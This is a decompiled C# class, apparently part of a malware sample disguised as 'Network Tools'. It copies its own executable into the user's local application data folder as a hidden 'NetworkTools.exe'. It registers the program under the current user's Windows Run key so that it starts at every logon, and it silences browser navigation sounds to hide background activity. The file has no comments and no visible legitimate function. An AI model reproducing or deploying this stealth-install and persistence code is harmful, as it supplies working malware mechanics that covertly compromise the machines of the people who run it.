using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace ns1;

internal class Class2
{
	public static string string_0 = "Network Tools";

	public static string string_1 = "NetworkTools.exe";

	[DllImport("urlmon.dll")]
	[return: MarshalAs(UnmanagedType.Error)]
	private static extern int CoInternetSetFeatureEnabled(int FeatureEntry, [MarshalAs(UnmanagedType.U4)] int dwFlags, bool fEnable);

	public static void smethod_0()
	{
		CoInternetSetFeatureEnabled(21, 2, fEnable: true);
	}

	public static void smethod_1(string string_2, string string_3)
	{
		if (File.Exists(string_3))
		{
			File.SetAttributes(string_3, FileAttributes.Normal);
		}
		try
		{
			File.Copy(string_2, string_3, overwrite: true);
		}
		catch (Exception)
		{
		}
		File.SetAttributes(string_3, FileAttributes.Hidden);
	}

	public static void smethod_2(string string_2, string string_3)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(string_2, string_3);
			registryKey.Close();
		}
	}

	public static void smethod_3()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		if (!(Path.GetDirectoryName(location) == folderPath))
		{
			smethod_1(location, folderPath + "\\" + string_1);
		}
	}
}
